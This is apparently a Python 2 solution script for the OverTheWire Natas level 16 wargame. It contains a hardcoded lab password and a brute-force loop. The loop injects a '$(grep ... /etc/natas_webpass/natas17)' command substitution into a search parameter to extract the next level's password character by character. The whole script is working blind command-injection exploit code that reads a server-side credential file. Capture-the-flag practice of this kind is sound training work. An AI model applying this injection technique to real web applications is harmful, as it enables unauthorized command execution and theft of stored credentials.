import requests
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
username="natas16"
password="WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
host="http://natas16.natas.labs.overthewire.org"
ans = ""
data = dict()
data['submit']= 'Search'
while True:
    for c in chars:
        data['needle']='$(grep -L ^'+ans+str(c)+'.* /etc/natas_webpass/natas17)hackers'
        r = requests.get(host,params=data,auth=(username,password))
        if "hackers" in r.text:
            print "success "+c
            ans += c
            break
    else:
        break
print ans
